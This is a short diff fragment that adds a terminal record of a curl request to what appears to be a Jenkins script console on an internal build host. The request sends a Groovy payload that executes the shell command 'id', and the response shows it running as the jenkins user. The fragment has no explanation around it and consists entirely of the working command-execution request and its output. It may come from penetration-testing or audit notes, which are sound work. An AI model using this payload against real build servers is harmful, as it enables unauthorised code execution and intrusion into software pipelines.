@@ -1,0 +1,7 @@
+$ curl -si 'http://ci.build.local:8080/scriptText' \
+    --data-urlencode 'script=println "id".execute().text'
+HTTP/1.1 200 OK
+X-Content-Type-Options: nosniff
+Content-Type: text/plain;charset=utf-8
+
+uid=1000(jenkins) gid=1000(jenkins) groups=1000(jenkins)
